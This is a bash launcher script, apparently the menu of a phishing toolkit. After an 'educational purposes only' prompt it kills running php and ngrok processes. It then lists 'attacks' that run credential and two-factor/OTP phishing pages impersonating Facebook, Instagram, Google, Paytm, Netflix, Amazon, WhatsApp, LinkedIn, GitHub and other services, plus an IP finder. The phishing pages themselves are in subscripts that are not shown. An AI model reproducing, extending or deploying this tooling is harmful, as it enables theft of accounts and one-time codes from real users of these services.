#!/bin/bash
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32mT H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear

clear
chmod 777 Logo.sh
./Logo.sh
echo ""
echo -e $'\e[1;32m\e[0m\e[1;32m SELECT ANY ATTACK  \e[0m'
echo -e $'\e[1;37m\e[0m\e[1;37m --------------------- > > >\e[0m'
echo ""

printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;32m]\e[0m\e[1;93m Zomato-TF0\e[0m             \e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m Instagram-Followers\e[0m       \e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook-TFO\e[0m           \e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m Amazon-TFO\e[0m                \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Instagram-TFO\e[0m          \e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m WhatsApp-TFO\e[0m              \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Uber Eats-TFO\e[0m          \e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m Linkedin-TFO\e[0m               \e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m OLA-TFO\e[0m                \e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;93m Hotstar-TFO\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Google-TFO\e[0m             \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Spotify-TFO\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m Paytm-TFO\e[0m              \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Github-TFO\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Netflix-TFO\e[0m            \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m IPFinder\e[0m\n"
echo ""
echo ""
                
                 read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
		 case $option in 
			 
                         1)cd sites/ 
                           cd Zomato-Phishing/
                           chmod 7777 Zomato.sh  
                           ./Zomato.sh 


                ;;
	        
	        2)cd sites/
                  cd facebook/
                  chmod 7777 facebook.sh  
                  ./facebook.sh 



                ;;

                3) cd sites/
                  cd instagram/
                  chmod 7777 instagram.sh 
                  ./instagram.sh 

                ;;

                4)cd sites/
                  cd UberEats-Phishing/
                  chmod 7777 Uber-eats.sh 
                  ./Uber-eats.sh 
               
                ;;
                 
                5) cd sites/
                  cd ola-otpbypass/
                  chmod 7777 ola.sh  
                  ./ola.sh
                ;;
                
                6)cd sites/
                  cd google-otp/
                  chmod 7777 Google-otp.sh 
                  ./Google-otp.sh

                ;;
  
                7)cd sites/
                  cd Paytm-Phishing/
                  chmod 7777 Paytm.sh 
                  ./Paytm.sh
 
                ;;

                8)cd sites/
                  cd Netflix/
                  chmod 7777 Netflix.sh   
                  ./Netflix.sh 

                ;;


               9)cd sites/
                  cd instafollow/
                  chmod 7777 instafollow.sh
                  ./instafollow.sh

                ;;

               10)cd sites/
                  cd amazonsign/
                  chmod 7777 amazonsign.sh  
                  ./amazonsign.sh

                ;;

                11)cd sites/
                  cd whatsapp-phishing/
                  chmod 7777 Whatsapp.sh  
                  ./Whatsapp.sh

                ;;

                12)cd sites/
                  cd Linkedin/
                  chmod 7777 Linkedin.sh 
                  ./Linkedin.sh

                ;;
   
                13)cd sites/
                  cd Hotstar-otp-bypass/
                  chmod 7777 Hotstar.sh  
                  ./Hotstar.sh

                ;;
      
                14)cd sites/
                  cd spotify/
                  chmod 7777 spotify.sh 
                  ./spotify.sh

                ;;

                15)cd sites/
                  cd github/
                  chmod 7777 github.sh 
                  ./github.sh

                ;;

                16)cd sites/
                   cd ipfinder/
                   chmod 7777 ipfinder.sh  
                  ./ipfinder.sh

                ;;

               
                99)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m                                                         >> THANKS FOR JOIN US >> \e[0m'
                   sleep 1
                   exit
                ;;


                esac
                ;;
